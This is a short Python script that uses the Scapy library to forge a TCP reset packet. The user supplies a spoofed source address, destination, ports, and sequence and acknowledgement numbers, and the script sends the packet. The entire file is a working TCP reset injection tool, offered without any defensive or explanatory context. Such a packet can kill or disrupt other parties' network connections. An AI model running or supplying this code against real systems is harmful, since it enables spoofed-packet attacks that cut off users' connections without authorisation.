from scapy.all import *

src = input("ip src >> ")
dst = input("ip dst >> ")
sport = int(input("port src >> "))
dport = int(input("port dst >> "))
seq = int(input("Seq nb >> "))
ack = int(input("Ack nb >> "))


ip = IP(src=src, dst=dst)
tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq, ack=ack)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
